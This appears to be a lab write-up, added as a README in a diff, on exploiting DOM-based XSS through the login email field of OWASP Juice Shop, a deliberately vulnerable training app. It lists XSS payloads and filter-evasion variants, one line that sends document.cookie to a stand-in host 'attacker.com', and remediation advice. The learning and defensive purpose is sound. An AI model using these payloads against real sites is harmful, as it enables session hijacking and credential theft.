@@ -1,0 +1,127 @@
+# 🛡️ Method 5 – Login Panel DOM-Based XSS via `email` Input Field
+
+This exploitation method targets a DOM-based Cross-Site Scripting (XSS) vulnerability in the login panel of OWASP Juice Shop, specifically through the `email` input field. The vulnerability occurs when the application reflects unsanitized user-controlled input (email value) directly into the Document Object Model (DOM), either as part of form re-rendering or error messages, without applying proper output encoding or escaping.
+
+---
+
+## 🔍 Technical Premise
+
+During a failed login attempt, Juice Shop may echo the submitted email address back into the page, either in:
+- A visible UI message (e.g., “No user exists with email: ___”)
+- An invisible span or field element for client-side reference
+
+If this reflection point uses an unsafe DOM sink such as `innerHTML` or if Angular/JS templates process the input via `{{email}}`, it becomes an entry point for DOM XSS.
+
+---
+
+## ⚙️ Reproduction Steps
+
+### Step 1: Open the Juice Shop Login Page
+Navigate to:
+http://localhost:3000/#/login
+
+php-template
+Copy code
+
+### Step 2: Craft the XSS Payload
+Inject a malicious payload into the `email` input field:
+```html
+"><script>alert('Login XSS')</script>
+Alternatively, use encoded variants to bypass input filtering or browser auto-sanitization:
+
+html
+Copy code
+%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E
+🧪 Expected Behavior
+After submitting the login form with invalid credentials, if the application reflects the email field back into the DOM without sanitizing the value:
+
+The browser will parse and execute the injected <script> tag
+
+You’ll observe a JavaScript alert box (alert('Login XSS'))
+
+The "Bonus Payload Challenge" will be marked as solved in the Juice Shop scoreboard
+
+This confirms DOM-based reflected XSS through the login panel.
+
+🔬 Vulnerable Sink Investigation
+To confirm the sink:
+
+Open browser DevTools → Elements tab after triggering the alert
+
+Search for Login XSS to locate the payload in the DOM
+
+Check the parent tag:
+
+Is it rendered inside a div or span with innerHTML? ✅ Vulnerable
+
+Is it inserted using jQuery .html() or Angular interpolation? ✅ Vulnerable
+
+💉 Payload Arsenal
+Test with variations to evade sanitization:
+
+html
+Copy code
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+"><iframe src=javascript:alert(1)>
+Use console.log(document.cookie) to inspect further impact or exfiltrate data:
+
+html
+Copy code
+<script>fetch('http://attacker.com/?cookie=' + document.cookie)</script>
+📸 PoC Evidence
+Capture a screenshot showing:
+
+The alert triggered via login input
+
+The Juice Shop scoreboard showing Bonus Payload challenge as completed
+
+File name convention:
+
+pgsql
+Copy code
+XSS-Login-Email-Field-Payload.png
+🔐 Security Impact
+Vector	Description
+Input	email field of login form
+Sink	Possibly innerHTML, Angular interpolation
+Impact	DOM-based Reflected XSS
+Severity	High if exploitable pre-authentication
+Risk	Credential theft, session hijacking
+
+🛡️ Recommendations (Dev Perspective)
+Risk	Recommended Fix
+DOM reflection without escaping	Encode email before injecting into DOM (textContent)
+Usage of innerHTML	Replace with textContent or safe DOM binding
+Lack of validation	Apply client-side and server-side validation
+CSP not enforced	Add strict Content-Security-Policy headers
+
+📁 Folder Structure
+pgsql
+Copy code
+OWASP-Juice-Shop-Bonus-Payload/
+└── Method-5-Login-Email-XSS/
+    ├── README.md
+    ├── To-Do-Login-Email-XSS.md
+    ├── payload.txt
+    ├── XSS-Login-Email-Field-Payload.png
+🧾 GitOps
+bash
+Copy code
+cd ~/juice-shop/OWASP-Juice-Shop-Bonus-Payload/Method-5-Login-Email-XSS/
+git add .
+git commit -m "🚨 Method-5: DOM XSS via login email field – payloads, PoC, and documentation"
+git push origin main
+✅ Summary
+✔️ Found unsanitized reflection in the login email field
+
+✔️ Injected a script to exploit DOM-based XSS
+
+✔️ Validated execution via alert popup
+
+✔️ Documented and captured screenshot
+
+⏳ Ready to push to GitHub for traceability
+
+DOM-based XSS in login fields is critical due to its pre-auth vector and impact potential. Always validate and sanitize user input before rendering into the frontend context.
+
